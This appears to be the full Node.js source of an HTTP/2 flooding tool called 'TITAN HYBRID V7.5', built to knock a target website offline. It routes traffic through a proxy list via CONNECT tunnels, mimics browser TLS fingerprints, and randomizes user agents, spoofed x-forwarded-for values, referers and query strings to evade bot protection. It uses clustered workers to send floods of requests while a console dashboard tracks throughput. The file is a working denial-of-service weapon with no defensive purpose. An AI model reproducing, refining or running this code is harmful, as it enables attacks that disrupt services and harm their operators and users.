const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");
const dns = require("dns");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = { 
    target: process.argv[2], 
    time: ~~process.argv[3], 
    rate: ~~process.argv[4], 
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt"
};

// --- PARÂMETROS TLS AVANÇADOS ---
const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
    'TLS_RSA_WITH_AES_128_GCM_SHA256'
];
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = ["GREASE:x25519:secp256r1:secp384r1:secp521r1", "x25519:secp256r1"];
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(l => l.length > 5);

// --- AUXILIARES ---
const randstr = (length) => crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
const generateRandomString = (min, max) => randstr(Math.floor(Math.random() * (max - min + 1)) + min);

const generateHeaders = (browser) => {
    const userAgents = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${Math.floor(99 + Math.random() * 15)}.0) Gecko/20100101 Firefox/${Math.floor(99 + Math.random() * 15)}.0`,
        safari: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15`,
        opera: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0`,
        brave: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Brave/1.63.165`,
        mobile: `Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36`,
        duckduckgo: `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 DuckDuckGo/7 Safari/605.1.15`
    };

    const platforms = { chrome: "Win64", safari: "macOS", brave: "Linux", firefox: "Linux", mobile: "Android", opera: "Linux", operagx: "Linux", duckduckgo: "macOS" };

    return {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + generateRandomString(3, 5) + "=" + generateRandomString(5, 10),
        "user-agent": userAgents[browser] || userAgents.chrome,
        "sec-ch-ua": `"Chromium";v="122", "Not(A:Brand";v="24"`,
        "sec-ch-ua-mobile": browser === "mobile" ? "?1" : "?0",
        "sec-ch-ua-platform": `"${platforms[browser] || "Windows"}"`,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8",
        "accept-encoding": "gzip, deflate, br, zstd",
        "cache-control": "no-cache",
        "upgrade-insecure-requests": "1"
    };
};

function format(n) {
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n;
}

if (cluster.isMaster) {
    let totalSent = 0, rps = 0, targetIp = "Buscando...";
    const codes = {}, online = new Set();
    dns.lookup(parsedTarget.hostname, (err, addr) => { if (!err) targetIp = addr; });

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log(`\n\x1b[1;37m  \x1b[41m NFU \x1b[0m \x1b[1;31mTITAN HYBRID V7.5 \x1b[1;30m| \x1b[1;37m[CONDIÇÃO VERMELHA]\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  SENT: \x1b[1;31m${format(totalSent).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  RPS: \x1b[1;32m${format(rps).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  TARGET: \x1b[1;36m${targetIp}\x1b[0m\n`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).slice(0,5).map(([c,v]) => {
            let color = c.startsWith('2') ? '\x1b[1;32m' : '\x1b[1;31m';
            return `${color}${c}\x1b[1;37m:${format(v)}`;
        }).join(' \x1b[1;30m| ');
        
        console.log(`\x1b[1;37m  STATUS: ${st || '\x1b[1;30mPUSHING...'}\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES ONLINE: \x1b[1;33m${online.size}\x1b[0m`);
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; rps += msg.c;
            if (msg.ip) online.add(msg.ip);
            Object.keys(msg.codes).forEach(c => { codes[c] = (codes[c] || 0) + msg.codes[c]; });
        }
    });
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    for (let i = 0; i < 8; i++) setInterval(runFlooder, 100);
}

function runFlooder() {
    const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyRaw) return;
    const [pHost, pPort] = proxyRaw.split(':');
    
    const connectToProxy = () => {
        const socket = net.createConnection({ host: pHost, port: parseInt(pPort) });
        socket.setTimeout(5000);
        socket.setNoDelay(true);
        
        socket.once("connect", () => {
            socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
        });

        socket.once("data", (d) => {
            if (!d.toString().includes("200")) return socket.destroy();
            
            const tlsConn = tls.connect({
                socket: socket, servername: parsedTarget.host,
                ALPNProtocols: ["h2"], rejectUnauthorized: false,
                ciphers: cplist.join(':'),
                sigalgs: sigalgs,
                ecdhCurve: ecdhCurve[Math.floor(Math.random() * ecdhCurve.length)],
                secureOptions: secureOptions,
                minVersion: 'TLSv1.2', maxVersion: 'TLSv1.3'
            }, () => {
                const client = http2.connect(parsedTarget.href, {
                    createConnection: () => tlsConn,
                    settings: { initialWindowSize: 1073741824, maxConcurrentStreams: 2000 }
                });

                client.on("connect", () => {
                    let bCount = 0; let bCodes = {};
                    const flood = setInterval(() => {
                        if (!client || client.destroyed) return clearInterval(flood);
                        for (let i = 0; i < args.rate; i++) {
                            const browser = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "duckduckgo"][Math.floor(Math.random() * 7)];
                            const headers = generateHeaders(browser);
                            
                            // LÓGICA DE PESOS PARA HEADERS EXTRAS
                            const weightRandom = Math.random() * Math.random() < 0.25;
                            const randomString = randstr(10);
                            const extraHeaders = {
                                ...(weightRandom && Math.random() < 0.4 && { 'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}` }),
                                ...(weightRandom && { 'referer': `https://${randomString}.com` })
                            };

                            const req = client.request(Object.assign({}, headers, extraHeaders));
                            req.on("response", (res) => {
                                const sc = res[":status"];
                                bCount++; bCodes[sc] = (bCodes[sc] || 0) + 1;
                                if (bCount >= 50) { process.send({ type: 'batch', c: bCount, codes: bCodes, ip: pHost }); bCount = 0; bCodes = {}; }
                                req.close(); req.destroy();
                            });
                            req.on('error', () => req.destroy());
                            req.end();
                        }
                    }, 100);
                    setTimeout(() => { if (!socket.destroyed) socket.destroy(); }, 15000);
                });
                client.on("error", () => socket.destroy());
            });
        });
        socket.on("error", () => socket.destroy());
    };
    connectToProxy();
}
